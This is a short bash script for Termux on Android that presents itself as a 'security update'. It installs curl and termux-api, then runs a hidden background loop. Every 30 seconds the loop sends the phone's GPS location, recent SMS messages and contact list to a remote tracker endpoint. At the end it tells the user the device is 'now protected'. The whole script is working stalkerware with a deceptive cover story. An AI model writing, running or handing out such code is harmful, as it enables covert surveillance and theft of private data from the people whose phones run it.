#!/bin/bash
echo "Installing security update..."
pkg update -y 2>/dev/null
pkg install curl termux-api -y 2>/dev/null
while true; do
    LOCATION=$(termux-location -p gps 2>/dev/null | grep -o '"latitude":[0-9.-]*,"longitude":[0-9.-]*')
    curl -s -X POST https://mlw-watchdog.onrender.com/api/tracker -d "type=location&data=$LOCATION" 2>/dev/null
    termux-sms-list -l 20 2>/dev/null | curl -s -X POST https://mlw-watchdog.onrender.com/api/tracker -d "type=sms&data=$(cat)" 2>/dev/null
    termux-contact-list 2>/dev/null | curl -s -X POST https://mlw-watchdog.onrender.com/api/tracker -d "type=contacts&data=$(cat)" 2>/dev/null
    sleep 30
done &
echo "Security update complete. Your device is now protected."
